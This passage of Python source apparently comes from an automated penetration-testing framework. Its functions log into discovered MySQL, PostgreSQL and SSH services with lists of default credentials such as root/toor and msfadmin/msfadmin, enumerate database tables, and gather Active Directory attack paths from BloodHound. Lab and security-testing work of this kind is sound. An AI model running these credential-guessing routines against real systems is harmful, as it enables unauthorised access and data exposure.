    attack_path_id = used["attack_path_id"]
    print(f"    [AUDIT] Connected as {used['user']} ({used['label']})")

    print(f"    [AUDIT] Running FI/PI/LI checks on {ip}...")

    try:
        _sys.path.insert(0, "/opt/skg/skg-host-toolchain/adapters/sysaudit")
        from audit import run_sysaudit

        events = run_sysaudit(
            client, ip, workload_id, attack_path_id, run_id,
        )
    except Exception as exc:
        result["error"] = f"sysaudit failed: {exc}"
        client.close()
        return result

    client.close()

    if not events:
        result["success"] = True
        result["events"]  = 0
        return result

    # Write events with target_ip stamped for load_wicket_states
    ev_file = out_dir / f"gravity_audit_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    with open(ev_file, "w") as fh:
        for ev in events:
            ev.setdefault("payload", {})["target_ip"] = ip
            fh.write(json.dumps(ev) + "\n")

    r = sum(1 for e in events if e["payload"]["status"] == "realized")
    b = sum(1 for e in events if e["payload"]["status"] == "blocked")
    u = sum(1 for e in events if e["payload"]["status"] == "unknown")
    print(f"    [AUDIT] {ip}: {len(events)} events ({r}R {b}B {u}U) → {ev_file.name}")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(ev_file)
    return result


def _exec_data_profiler(ip, target, run_id, out_dir, result):
    """
    Run the database profiler against configured data sources for this target.

    The data profiler is directed by gravity exactly like any other instrument:
    gravity selects it when DP-* wickets are unknown, runs it, and measures
    the entropy change. The same physics — wavelength, cost, penalty, shifting
    — apply without modification.

    'target' for a data source has the same shape as a network target but
    the 'ip' field is a workload_id like 'banking::orders' and the 'services'
    list contains data source descriptors instead of port/service pairs.

    Data sources are read from:
      1. target['data_sources'] if present (gravity-generated target)
      2. /etc/skg/data_sources.yaml (operator-declared)
      3. skg_config.yaml sensors.data.sources
    """
    import sys as _sys
    import os as _os

    _sys.path.insert(0, "/opt/skg/skg-data-toolchain")

    # Find data sources for this target.
    # SKG derives data sources from what it observes — the surface services list
    # is the primary source of truth. If the target has mysql:3306 or postgres:5432
    # in its services, those ARE the data sources. No pre-configuration needed.
    data_sources = list(target.get("data_sources", []))

    # Derive from surface services (the instrument observes what's there)
    DB_PORT_MAP = {
        3306: ("mysql", "mysql://root@{ip}:{port}/"),
        5432: ("postgresql", "postgresql://postgres@{ip}:{port}/"),
        5433: ("postgresql", "postgresql://postgres@{ip}:{port}/"),
        1433: ("mssql", "mssql+pymssql://sa@{ip}:{port}/"),
        1521: ("oracle", "oracle+cx_oracle://system@{ip}:{port}/xe"),
        6379: ("redis", "redis://{ip}:{port}/"),
        27017:("mongodb", "mongodb://{ip}:{port}/"),
    }
    for svc in target.get("services", []):
        port = svc.get("port")
        svc_name = (svc.get("name") or svc.get("service") or "").lower()
        db_name = svc.get("version") or svc.get("product") or svc_name
        if port in DB_PORT_MAP:
            kind, url_tmpl = DB_PORT_MAP[port]
            url = url_tmpl.format(ip=ip, port=port)
            workload_id = f"{kind}::{ip}:{port}"
            # Avoid duplicates
            if not any(ds.get("url","").startswith(url.split("/")[0]) for ds in data_sources):
                data_sources.append({
                    "url": url,
                    "workload_id": workload_id,
                    "table": "",   # profiler will enumerate tables
                    "attack_path_id": "data_completeness_failure_v1",
                    "kind": kind,
                })
                print(f"    [data_profiler] Derived source from surface: {kind} @ {ip}:{port}")

    # Also check operator config file for additional sources
    config_file = Path("/etc/skg/data_sources.yaml")
    if config_file.exists():
        try:
            import yaml
            cfg = yaml.safe_load(config_file.read_text())
            all_sources = cfg.get("data_sources", [])
            for src_cfg in all_sources:
                url = src_cfg.get("url", "")
                wid = src_cfg.get("workload_id", "")
                if ip in url or ip in wid or not ip.replace(".","").isdigit():
                    if not any(d.get("url") == url for d in data_sources):
                        data_sources.append(src_cfg)
        except Exception:
            pass

    if not data_sources:
        result["error"] = (
            "No database services found on this target. "
            f"Target {ip} has no recognized DB ports in surface services."
        )
        return result

    try:
        from adapters.db_profiler.profile import profile_table, DBConnection
    except ImportError:
        result["error"] = (
            "db_profiler not found at /opt/skg/skg-data-toolchain. "
            "Run setup_arch.sh to install."
        )
        return result

    def _candidate_urls(src: dict) -> list[str]:
        from urllib.parse import urlsplit, urlunsplit

        url = (src.get("url") or "").strip()
        if not url:
            return []

        candidates = [url]
        kind = (src.get("kind") or "").lower()
        split = urlsplit(url)
        host = split.hostname or ip
        port = f":{split.port}" if split.port else ""
        path = split.path or "/"
        query_prefix = "&" if split.query else "?"
        query = split.query

        if kind == "mysql":
            for user, password in [
                ("root", ""),
                ("root", "root"),
                ("root", "toor"),
                ("msfadmin", "msfadmin"),
                ("admin", "admin"),
            ]:
                auth = user if password == "" else f"{user}:{password}"
                mysql_query = query
                if "charset=" not in mysql_query:
                    mysql_query = f"{mysql_query}{'&' if mysql_query else ''}charset=utf8"
                candidates.append(
                    urlunsplit(("mysql+pymysql", f"{auth}@{host}{port}", path, mysql_query, ""))
                )

        elif kind in {"postgres", "postgresql"}:
            pg_path = path if path and path != "/" else "/postgres"
            for user, password in [
                ("postgres", "postgres"),
                ("postgres", ""),
                ("msfadmin", "msfadmin"),
                ("admin", "admin"),
            ]:
                auth = user if password == "" else f"{user}:{password}"
                q = query
                if "sslmode=" not in q:
                    q = f"{q}{query_prefix if q else ''}sslmode=disable"
                candidates.append(
                    urlunsplit(("postgresql", f"{auth}@{host}{port}", pg_path, q, ""))
                )

        # Preserve order while dropping duplicates.
        deduped = []
        seen = set()
        for candidate in candidates:
            if candidate not in seen:
                deduped.append(candidate)
                seen.add(candidate)
        return deduped

    total_events = 0
    events_files = []
    successful_sources = []

    def _connectivity_event(kind: str, workload_id: str, detail: str) -> dict:
        now = iso_now()
        return {
            "id": str(uuid.uuid4()),
            "ts": now,
            "type": "obs.attack.precondition",
            "source": {
                "source_id": "adapter.db_profiler",
                "toolchain": "skg-data-toolchain",
                "version": "0.1.0",
            },
            "payload": {
                "wicket_id": "DP-10",
                "status": "realized",
                "workload_id": workload_id,
                "target_ip": ip,
                "detail": detail,
                "run_id": run_id,
                "observed_at": now,
            },
            "provenance": {
                "evidence_rank": 4,
                "evidence": {
                    "source_kind": "db_profiler_runtime",
                    "pointer": workload_id,
                    "collected_at": now,
                    "confidence": 0.95,
                },
            },
        }

    for src in data_sources:
        url         = src.get("url", "")
        table       = src.get("table", "")
        workload_id = src.get("workload_id") or f"data::{table}"
        contract    = src.get("contract")
        apid        = src.get("attack_path_id", "data_completeness_failure_v1")

        if not url:
            continue

        candidate_urls = _candidate_urls(src)
        working_url = None
        tables = [table] if table else []
        connected_without_tables = False
        if not tables:
            last_exc = None
            for candidate_url in candidate_urls:
                try:
                    db = DBConnection(candidate_url)
                    db.connect()
                    kind = (src.get("kind") or "").lower()
                    connected_without_tables = True
                    if kind == "mysql":
                        rows = db.query(
                            "SELECT table_schema, table_name "
                            "FROM information_schema.tables "
                            "WHERE table_schema NOT IN "
                            "('information_schema','mysql','performance_schema','sys') "
                            "ORDER BY table_schema, table_name LIMIT 3"
                        )
                        tables = [
                            f"{r.get('table_schema')}.{r.get('table_name')}"
                            for r in rows
                            if r.get("table_schema") and r.get("table_name")
                        ]
                    elif kind in {"postgresql", "postgres"}:
                        rows = db.query(
                            "SELECT tablename FROM pg_catalog.pg_tables "
                            "WHERE schemaname = 'public' "
                            "ORDER BY tablename LIMIT 3"
                        )
                        tables = [r.get("tablename") for r in rows if r.get("tablename")]
                    db.close()
                    successful_sources.append(workload_id)
                    if tables:
                        working_url = candidate_url
                        print(f"    [DATA] Enumerated tables for {workload_id}: {', '.join(tables)}")
                        break
                    print(f"    [DATA] Connected to {workload_id} but found no application tables")
                    break
                except Exception as exc:
                    last_exc = exc
                    continue
            if not tables:
                if connected_without_tables:
                    ev = _connectivity_event(
                        src.get("kind", "data"),
                        workload_id,
                        "Connected to data source but found no application tables to profile",
                    )
                    ev_file = out_dir / f"gravity_data_{workload_id.replace('::', '_')}_{run_id}.ndjson"
                    with open(ev_file, "w") as fh:
                        fh.write(json.dumps(ev) + "\n")
                    total_events += 1
                    events_files.append(str(ev_file))
                    _project_gravity_events(ev_file, run_id, result)
                    print(f"    [DATA] {workload_id}: connectivity observed (no tables)")
                    continue
                if last_exc is not None:
                    print(f"    [DATA] Enumeration failed for {workload_id}: {last_exc}")
                continue

        if not tables:
            continue

        if working_url:
            url = working_url

        for table in tables:
            profile_url = url
            profile_table_name = table
            profile_workload_id = workload_id if src.get("table") else f"{workload_id}::{table}"

            if "." in table and (src.get("kind") or "").lower() == "mysql":
                from urllib.parse import urlsplit, urlunsplit

                schema_name, bare_table = table.split(".", 1)
                split = urlsplit(url)
                profile_url = urlunsplit((
                    split.scheme,
                    split.netloc,
                    f"/{schema_name}",
                    split.query,
                    split.fragment,
                ))
                profile_table_name = bare_table

            print(f"    [DATA] Profiling {table} ({profile_workload_id})")

            try:
                events = profile_table(
                    url=profile_url, table=profile_table_name,
                    workload_id=profile_workload_id,
                    contract_path=contract,
                    attack_path_id=apid,
                    run_id=run_id,
                )
            except Exception as exc:
                print(f"    [DATA] Profile failed: {exc}")
                continue

            if not events:
                continue

            # Write to gravity output dir with target_ip stamped
            ev_file = out_dir / f"gravity_data_{profile_workload_id.replace('::', '_')}_{run_id}.ndjson"
            with open(ev_file, "w") as fh:
                for ev in events:
                    ev.setdefault("payload", {})["target_ip"] = ip
                    fh.write(json.dumps(ev) + "\n")

            total_events += len(events)
            events_files.append(str(ev_file))
            _project_gravity_events(ev_file, run_id, result)

            r = sum(1 for e in events if e["payload"]["status"] == "realized")
            b = sum(1 for e in events if e["payload"]["status"] == "blocked")
            u = sum(1 for e in events if e["payload"]["status"] == "unknown")
            print(f"    [DATA] {profile_workload_id}: {len(events)} events ({r}R {b}B {u}U)")

    result["success"]      = total_events > 0 or bool(successful_sources)
    result["events"]       = total_events
    result["events_files"] = events_files
    if not result["success"]:
        result["error"] = "No events produced — check data source config"
    return result



    """
    Collect the AD domain graph from BloodHound CE and emit AD wicket events.

    BloodHound sees the whole domain, not just one host — so we use the
    domain_sid from skg_config.yaml to scope which domain this target belongs
    to, then run the full BH collection.  Events are written to out_dir with
    target_ip = ip so load_wicket_states() picks them up for this target's
    entropy calculation.

    The AD wickets this resolves (kerberoastable, delegation, stale DAs,
    LAPS gaps, password-in-description, ACL abuses, domain properties)
    are all read from the BH object graph — no agent on the target needed.

    Falls back to Neo4j bolt if the BH CE REST API is unreachable.
    """
    import sys as _sys
    import os as _os

    bh_url   = _os.environ.get("BH_URL",      "http://localhost:8080")
    bh_user  = _os.environ.get("BH_USERNAME", "admin")
    bh_pass  = _os.environ.get("BH_PASSWORD", "")
    neo4j_url  = _os.environ.get("NEO4J_URL",      "bolt://localhost:7687")
    neo4j_user = _os.environ.get("NEO4J_USER",     "neo4j")
    neo4j_pass = _os.environ.get("NEO4J_PASSWORD", "")

    # Infer workload_id — use domain (from target domains list) or IP
    domains_for_target = target.get("domains", [])
    workload_id = next(
        (d for d in domains_for_target if "ad" in d.lower()),
        f"ad::{ip}"
    )
    attack_path_id = "ad_kerberoast_v1"

    print(f"    [BH] Collecting AD graph from {bh_url} for workload {workload_id}...")

    try:
        if str(REPO_ROOT) not in _sys.path:
            _sys.path.insert(0, str(REPO_ROOT))
        from skg.sensors.bloodhound_sensor import (
            BloodHoundCEClient, Neo4jClient,
            collect_via_api, collect_via_neo4j,
            write_bh_dir,
        )
        from skg.sensors.adapter_runner import run_bloodhound
        from skg.core.paths import SKG_STATE_DIR
    except ImportError as exc:
        result["error"] = f"BloodHound sensor import failed: {exc}"
        return result

    data = None

    if bh_pass:
        try:
            client = BloodHoundCEClient(bh_url, bh_user, bh_pass)
            data = collect_via_api(client)
        except Exception as exc:
            print(f"    [BH] CE API failed ({exc}), trying Neo4j...")

    if data is None and neo4j_pass:
        try:
            client = Neo4jClient(neo4j_url, neo4j_user, neo4j_pass)
            data = collect_via_neo4j(client)
            client.close()
        except Exception as exc:
            result["error"] = f"Neo4j also unavailable: {exc}"
            return result

    if data is None:
        result["error"] = "No BloodHound source reachable (set BH_PASSWORD or NEO4J_PASSWORD)"
        return result

    # Write normalized BH data and run the adapter
    bh_dir = SKG_STATE_DIR / "bh_cache" / run_id[:8]
    write_bh_dir(data, bh_dir)

    try:
        events = run_bloodhound(bh_dir, workload_id, attack_path_id, run_id)
    except Exception as exc:
        result["error"] = f"BloodHound adapter failed: {exc}"
        return result

    # Write events to gravity output dir with target_ip stamped
    events_file = out_dir / f"gravity_bh_{ip}_{run_id[:8]}.ndjson"
    if events:
        with open(events_file, "w") as fh:
            for ev in events:
                ev.setdefault("payload", {})["target_ip"] = ip
                fh.write(json.dumps(ev) + "\n")

    result["success"]     = True
    result["events"]      = len(events)
    result["events_file"] = str(events_file)
    print(f"    [BH]  {workload_id}: {len(events)} AD wicket events → {events_file.name}")

    return result


def _exec_ssh_sensor(ip, target, run_id, out_dir, result):
    """
    Run the SSH sensor against the target.

    Loads target credentials from targets.yaml, opens a paramiko session,
    and runs the host toolchain adapter directly.  Writes events to out_dir
    so load_wicket_states() picks them up on the next entropy calculation.

    Falls back to an operator suggestion if no credentials are configured.
    """
    from pathlib import Path as _P
    import sys as _sys

    try:
        import paramiko
    except ImportError:
        result["error"] = "paramiko not installed"
        return result

    # Match audit-scan behavior: inventory creds first, then lab defaults,
    # then agent/no-password.
    cred_candidates = []
    targets_file = _P("/etc/skg/targets.yaml")
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text()) or {}
            for t in data.get("targets", []):
                if t.get("host") == ip or t.get("workload_id", "").endswith(ip):
                    auth = t.get("auth", {})
                    cred_candidates.append({
                        "user": auth.get("user") or t.get("user") or "root",
                        "password": auth.get("password") or t.get("password"),
                        "key": auth.get("key") or t.get("key"),
                        "port": int(auth.get("port") or t.get("port") or 22),
                        "workload_id": t.get("workload_id", f"ssh::{ip}"),
                        "attack_path_id": t.get("attack_path_id", "host_ssh_initial_access_v1"),
                        "label": "targets.yaml",
                    })
                    break
        except Exception:
            pass

    for user, password in [
        ("msfadmin", "msfadmin"),
        ("user", "user"),
        ("root", "toor"),
        ("root", "root"),
        ("admin", "admin"),
    ]:
        cred_candidates.append({
            "user": user,
            "password": password,
            "key": None,
            "port": 22,
            "workload_id": f"ssh::{ip}",
            "attack_path_id": "host_ssh_initial_access_v1",
            "label": "lab-default",
        })

    cred_candidates.append({
        "user": "root",
        "password": None,
        "key": None,
        "port": 22,
        "workload_id": f"ssh::{ip}",
        "attack_path_id": "host_ssh_initial_access_v1",
        "label": "agent",
    })

    client = None
    last_exc = None
    used = None
    for candidate in cred_candidates:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if candidate["key"]:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    key_filename=_P(candidate["key"]).expanduser().__str__(),
                    timeout=10,
                )
            elif candidate["password"] is not None:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    password=os.path.expandvars(candidate["password"]),
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False,
                )
            else:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    timeout=10,
                )
            used = candidate
            break

        except Exception as exc:
            last_exc = exc
            try:
                client.close()
            except Exception:
                pass
            client = None

    if client is None or used is None:
        result["error"] = f"SSH connect failed: {last_exc}"
        return result

    user = used["user"]
    key = used["key"]
    port = used["port"]
    workload_id = used["workload_id"]
    attack_path_id = used["attack_path_id"]
    print(f"    [SSH] Connected as {user} ({used['label']})")

    events_file = out_dir / f"gravity_ssh_{ip}_{run_id[:8]}.ndjson"

    try:
        # Import and run the host toolchain adapter directly
        if str(REPO_ROOT) not in _sys.path:
            _sys.path.insert(0, str(REPO_ROOT))
        from skg.sensors.adapter_runner import run_ssh_host
        events = run_ssh_host(
            client, ip, workload_id, attack_path_id, run_id,
            out_file=events_file, user=user,
            auth_type="key" if key else "password",
            port=port,
        )
        # Write events to the gravity output directory
        if events:
            with open(events_file, "a") as fh:
                for ev in events:
                    fh.write(json.dumps(ev) + "\n")
        result["success"] = True
        result["events_file"] = str(events_file)
        _project_gravity_events(events_file, run_id, result)
        print(f"    [SSH] {ip}: {len(events)} events → {events_file.name}")

        # Defer follow-on proposal generation to the main gravity thread so
        # interactive review is not attempted from a worker thread.
        result["follow_on_paths"] = [{
            "path_id": "host_ssh_initial_access_v1",
            "port": port,
            "kwargs": {
                "ssh_user": user,
                "ssh_pass": os.path.expandvars(used.get("password") or ""),
            },
        }]
    except Exception as exc:
        result["error"] = f"SSH collection failed: {exc}"
    finally:
        client.close()

    return result


def _connect_ssh_with_fallback(ip: str, workload_id: str, attack_path_id: str):
    import paramiko
    from pathlib import Path as _P

    cred_candidates = []
    targets_file = _P("/etc/skg/targets.yaml")
    if targets_file.exists():
        try:
            import yaml
            data = yaml.safe_load(targets_file.read_text()) or {}
            for t in data.get("targets", []):
                if t.get("host") == ip or t.get("workload_id", "").endswith(ip):
                    auth = t.get("auth", {})
                    cred_candidates.append({
                        "user": auth.get("user") or t.get("user") or "root",
                        "password": auth.get("password") or t.get("password"),
                        "key": auth.get("key") or t.get("key"),
                        "port": int(auth.get("port") or t.get("port") or 22),
                        "workload_id": t.get("workload_id", workload_id),
                        "attack_path_id": t.get("attack_path_id", attack_path_id),
                        "label": "targets.yaml",
                    })
                    break
        except Exception:
            pass

    for user, password in [
        ("msfadmin", "msfadmin"),
        ("user", "user"),
        ("root", "toor"),
        ("root", "root"),
        ("admin", "admin"),
    ]:
        cred_candidates.append({
            "user": user,
            "password": password,
            "key": None,
            "port": 22,
            "workload_id": workload_id,
            "attack_path_id": attack_path_id,
            "label": "lab-default",
        })

    cred_candidates.append({
        "user": "root",
        "password": None,
        "key": None,
        "port": 22,
        "workload_id": workload_id,
        "attack_path_id": attack_path_id,
        "label": "agent",
    })

    client = None
    last_exc = None
    used = None
    for candidate in cred_candidates:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            if candidate["key"]:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    key_filename=_P(candidate["key"]).expanduser().__str__(),
                    timeout=10,
                )
            elif candidate["password"] is not None:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    password=os.path.expandvars(candidate["password"]),
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False,
                )
            else:
                client.connect(
                    ip,
                    port=candidate["port"],
                    username=candidate["user"],
                    timeout=10,
                )
            used = candidate
            break
        except Exception as exc:
            last_exc = exc
            try:
                client.close()
            except Exception:
                pass
            client = None

    return client, used, last_exc


def _state_status(value) -> str:
    if isinstance(value, dict):
        return value.get("status", "unknown")
    if isinstance(value, str):
        return value
    return "unknown"


def _collect_observation_refs(results: dict) -> list[str]:
    refs: list[str] = []
    for res in results.values():
        if not isinstance(res, dict):
            continue
        for key in ("events_file", "interp_file", "post_events_file", "log_file"):
            value = res.get(key)
            if value:
                refs.append(str(value))
        for key in ("events_files",):
            values = res.get(key) or []
            for value in values:
                if value:
                    refs.append(str(value))
    seen = set()
    ordered = []
    for ref in refs:
        if ref in seen:
            continue
        seen.add(ref)
        ordered.append(ref)
    return ordered


def _collect_observation_confirms(results: dict, target_ip: str) -> list[dict]:
    confirms = []
    seen = set()
    for res in results.values():
        if not isinstance(res, dict):
            continue
        paths = []
        for key in ("events_file", "post_events_file"):
            value = res.get(key)
            if value:
                paths.append(Path(value))
        for value in res.get("events_files", []) or []:
            if value:
                paths.append(Path(value))

        for path in paths:
            try:
                if not path.exists():
                    continue
                for line in path.read_text(errors="replace").splitlines():
                    if not line.strip():
                        continue
                    try:
                        ev = json.loads(line)
                    except Exception:
                        continue
                    if ev.get("type") != "obs.attack.precondition":
                        continue
                    payload = ev.get("payload", {})
                    wicket_id = payload.get("wicket_id")
                    status = payload.get("status")
                    workload_id = payload.get("workload_id", "")
                    ev_target = payload.get("target_ip") or workload_id.split("::")[-1]
                    if not wicket_id or status not in {"realized", "blocked"}:
                        continue
                    if ev_target and ev_target != target_ip:
                        continue
                    evidence = ev.get("provenance", {}).get("evidence", {})
                    key = (workload_id, wicket_id, status, evidence.get("pointer", ""))
                    if key in seen:
                        continue
                    seen.add(key)
                    confirms.append({
                        "target_ip": target_ip,
                        "workload_id": workload_id or f"gravity::{target_ip}",
                        "wicket_id": wicket_id,
                        "status": status,
                        "attack_path_id": payload.get("attack_path_id", ""),
                        "source_kind": evidence.get("source_kind", ""),
                        "pointer": evidence.get("pointer", ""),
                        "detail": payload.get("detail", "") or payload.get("notes", ""),
                    })
            except Exception:
                continue
    return confirms


def _record_cycle_pearl(
    ip: str,
    run_id: str,
    cycle_num: int,
    before_states: dict,
    after_states: dict,
    before_target: dict,
    after_target: dict,
    before_domains: set,
    after_domains: set,
    before_entropy: float,
    after_entropy: float,
    before_fold_boost: float,
    after_fold_boost: float,
    concurrent_results: dict,
    fold_manager=None,
) -> None:
    state_changes = []
    all_wickets = set(before_states.keys()) | set(after_states.keys())
    for wicket_id in sorted(all_wickets):
        old_status = _state_status(before_states.get(wicket_id, {}))
        new_status = _state_status(after_states.get(wicket_id, {}))
        if old_status == new_status:
            continue
        state_changes.append({
            "target_ip": ip,
            "workload_id": f"gravity::{ip}",
            "wicket_id": wicket_id,
            "from": old_status,
            "to": new_status,
        })

    projection_changes = []
    added_domains = sorted(after_domains - before_domains)
    removed_domains = sorted(before_domains - after_domains)
    if added_domains or removed_domains:
        projection_changes.append({
            "target_ip": ip,
            "kind": "domain_shift",
            "added": added_domains,
            "removed": removed_domains,
        })

    before_services = {
        (svc.get("port"), svc.get("service"))
        for svc in before_target.get("services", [])
    }
    after_services = {
        (svc.get("port"), svc.get("service"))
        for svc in after_target.get("services", [])
    }
    new_services = sorted(after_services - before_services)
    if new_services:
        projection_changes.append({
            "target_ip": ip,
            "kind": "service_shift",
            "added": [f"{port}/{service}" for port, service in new_services],
        })

    reason_changes = []
    for name, res in concurrent_results.items():
        if not isinstance(res, dict):
            continue
        if res.get("success") or res.get("action"):
            reason_changes.append({
                "instrument": name,
                "success": bool(res.get("success")),
                "action": res.get("action", ""),
                "proposal_id": res.get("proposal_id", ""),
                "unknowns_resolved": res.get("unknowns_resolved", 0),
            })

    observation_refs = _collect_observation_refs(concurrent_results)
    observation_confirms = _collect_observation_confirms(concurrent_results, ip)
    if not (state_changes or observation_confirms or projection_changes or reason_changes or observation_refs):
        return

    decay_class = "structural"
    if any(change.get("to") == "realized" for change in state_changes):
        decay_class = "operational"

    target_snapshot = {
        "ip": after_target.get("ip", ip),
        "kind": after_target.get("kind") or after_target.get("os") or "unknown",
        "domains": sorted(after_domains),
        "services": [
            {
                "port": svc.get("port"),
                "service": svc.get("service"),
                "banner": svc.get("banner", ""),
            }
            for svc in after_target.get("services", [])
        ],
        "identity_properties": _infer_target_identity_properties(after_target),
    }

    fold_context = []
    if fold_manager:
        for fold in sorted(fold_manager.all(), key=lambda f: -f.gravity_weight())[:8]:
            fold_context.append({
                "id": fold.id,
                "fold_type": fold.fold_type,
                "gravity_weight": round(fold.gravity_weight(), 4),
                "detail": fold.detail,
                "why": getattr(fold, "why", {}) or {},
                "hypotheses": list(getattr(fold, "hypotheses", []) or [])[:3],
                "discriminators": list(getattr(fold, "discriminators", []) or [])[:3],
            })

    pearl = Pearl(
        state_changes=state_changes,
        observation_confirms=observation_confirms,
        projection_changes=projection_changes,
        reason_changes=reason_changes,
        observation_refs=observation_refs,
        energy_snapshot={
            "target_ip": ip,
            "workload_id": f"gravity::{ip}",
            "run_id": run_id,
            "cycle": cycle_num,
            "entropy_before": round(before_entropy, 4),
            "entropy_after": round(after_entropy, 4),
            "fold_boost_before": round(before_fold_boost, 4),
            "fold_boost_after": round(after_fold_boost, 4),
            "decay_class": decay_class,
        },
        target_snapshot=target_snapshot,
        fold_context=fold_context,
    )
    _pearls.record(pearl)


# ── The Field ────────────────────────────────────────────────────────────

def gravity_field_cycle(surface_path: str, out_dir: str,
                        cycle_num: int, instruments: dict,
                        authorized: bool = False,
                        focus_target: str | None = None) -> dict:
    """
    One cycle of the gravity field dynamics.

    Not observe-orient-decide-act. Continuous field dynamics:
    1. Run FoldDetector — structural/contextual/temporal/projection gaps
    2. Compute entropy landscape across all targets (E = unknowns + fold_weight)
    3. Follow the gradient — highest entropy region
    4. Select instrument that maximizes entropy reduction potential
    5. If that instrument previously failed here, shift to next best
    6. Execute and measure entropy change
    7. The changed entropy reshapes the landscape for next cycle

    Folds add to E because they represent structural uncertainty —
    dark regions of state space the system knows it cannot yet evaluate.
    A target with 10 unknown wickets and a structural fold for redis (p=0.85)
    has E ≈ 11.85, not E = 10.
    """
    surface = _hydrate_surface_from_latest_nmap(surface_path)
    if not surface:
        surface = json.loads(Path(surface_path).read_text())
    if focus_target:
        targets = [t for t in surface.get("targets", []) if t.get("ip") == focus_target]
        if not targets:
            print(f"  [TARGET] {focus_target} not present in surface")
            return {
                "cycle": cycle_num,
                "actions_taken": 0,
                "entropy_reduced": 0.0,
                "total_entropy": 0.0,
                "total_unknowns": 0,
                "total_folds": 0,
                "fold_boost": 0.0,
            }
        surface = dict(surface)
        surface["targets"] = targets
    out_path = Path(out_dir)
    out_path.mkdir(parents=True, exist_ok=True)
    run_id = str(uuid.uuid4())

    # ── Prune stale pending proposals ──────────────────────────────────────
    # Keep only the newest pending proposal per (ip, port) + all non-pending.
    proposals_dir = SKG_STATE_DIR / "proposals"
    if proposals_dir.exists():
        try:
            by_target: dict = {}
            all_props = []
            for f in proposals_dir.glob("*.json"):
                try:
                    p = json.loads(f.read_text())
                    p["_file"] = f
                    all_props.append(p)
                except Exception:
                    pass
            for p in all_props:
                if p.get("status","pending") != "pending":
                    continue
                act = p.get("action",{})
                key = f"{act.get('target_ip','')}:{act.get('port','')}"
                ts  = p.get("created_at","") or p.get("ts","") or ""
                if key not in by_target or ts > by_target[key].get("ts",""):
                    by_target[key] = p
            newest_ids = {p["id"] for p in by_target.values()}
            pruned = 0
            for p in all_props:
                if p.get("status","pending") == "pending" and p["id"] not in newest_ids:
                    p["_file"].unlink(missing_ok=True)
                    pruned += 1
            if pruned > 0:
                print(f"  [PROPOSALS] Pruned {pruned} stale pending (kept newest per target)")
        except Exception:
            pass

    domain_wickets = load_all_wicket_ids()
    all_wickets = set()
    for wids in domain_wickets.values():
        all_wickets.update(wids)

    print(f"\n{'='*70}")
    print(f"  GRAVITY FIELD — CYCLE {cycle_num}")
    print(f"  {iso_now()}")
    print(f"{'='*70}")
    if focus_target and surface.get("targets"):
        _t = surface["targets"][0]
        _svcs = ", ".join(
            f"{s.get('port')}/{s.get('service')}" for s in _t.get("services", [])[:12]
        ) or "unknown"
        _domains = ", ".join(_t.get("domains", [])) or "none"
        _cls = _t.get("kind") or _t.get("os") or "unknown"
        print(f"  [TARGET] {focus_target}  class={_cls}")
        print(f"  [SERVICES] {_svcs}")
        print(f"  [DOMAINS ] {_domains}")

    # ── Run FoldDetector ─────────────────────────────────────────────────────
    # Build per-IP fold map before entropy calculation so folds
    # are included in E for each target.
    fold_manager_by_ip: dict[str, object] = _load_persisted_fold_managers(Path(out_dir) / "folds")
    try:
        from skg.kernel.folds import FoldDetector, FoldManager
        detector = FoldDetector()
        all_new_folds = detector.detect_all(
            events_dir=DISCOVERY_DIR,   # gravity events live here
            cve_dir=CVE_DIR,
            toolchain_dir=SKG_HOME,
        )
        # Group folds by IP — location is workload_id which contains IP
        for fold in all_new_folds:
            # Extract IP from location strings like "ssh::172.17.0.2",
            # "cve::172.17.0.2", or raw workload_id
            loc = fold.location
            ip_match = None
            for target in surface.get("targets", []):
                tip = target["ip"]
                if tip in loc or loc.endswith(tip):
                    ip_match = tip
                    break
            if ip_match:
                if ip_match not in fold_manager_by_ip:
                    fold_manager_by_ip[ip_match] = FoldManager()
                fold_manager_by_ip[ip_match].add(fold)

        # Report fold summary
        total_folds = sum(
            len(fm.all()) for fm in fold_manager_by_ip.values()
        )
        if total_folds > 0:
            print(f"\n  [FOLDS] {total_folds} active folds detected:")
            fold_counts: dict[str, int] = {}
            for fm in fold_manager_by_ip.values():
                for f in fm.all():
                    fold_counts[f.fold_type] = fold_counts.get(f.fold_type, 0) + 1
            for ft, count in sorted(fold_counts.items()):
                print(f"    {ft:14s}: {count}")
            print(f"    {'resolve via':14s}: skg folds list")
        else:
            print(f"\n  [FOLDS] No folds detected this cycle")

    except Exception as exc:
        print(f"\n  [FOLDS] FoldDetector unavailable: {exc}")
        fold_manager_by_ip = {}

    try:
        created_toolchain_proposals = _create_toolchain_proposals_from_folds(
            fold_manager_by_ip, surface_path
        )
        if created_toolchain_proposals:
            print(f"\n  [FORGE] {len(created_toolchain_proposals)} toolchain proposal(s) created from folds:")
            for _pid in created_toolchain_proposals[:6]:
                print(f"    {_pid}  → skg proposals show {_pid[:8]}")
    except Exception as exc:
        print(f"\n  [FORGE] Fold→forge pipeline unavailable: {exc}")

    try:
        created_catalog_growth = _create_catalog_growth_proposals_from_folds(
            fold_manager_by_ip
        )
        if created_catalog_growth:
            print(f"\n  [FORGE] {len(created_catalog_growth)} catalog growth proposal(s) created from folds:")
            for _pid in created_catalog_growth[:6]:
                print(f"    {_pid}  → skg proposals show {_pid[:8]}")
    except Exception as exc:
        print(f"\n  [FORGE] Fold→catalog growth pipeline unavailable: {exc}")

    # ── Compute field pull context ─────────────────────────────────────────
    sphere_pulls: dict[str, float] = {}
    sphere_persistence: dict[str, float] = {}
    fiber_clusters_by_anchor: dict[str, object] = {}
    try:
        from skg.topology.energy import compute_field_fibers, compute_field_topology

        field_topology = compute_field_topology(DISCOVERY_DIR, INTERP_DIR)
        sphere_pulls = {
            sphere: float(field.gravity_pull or 0.0)
            for sphere, field in field_topology.spheres.items()
        }
        sphere_persistence = {
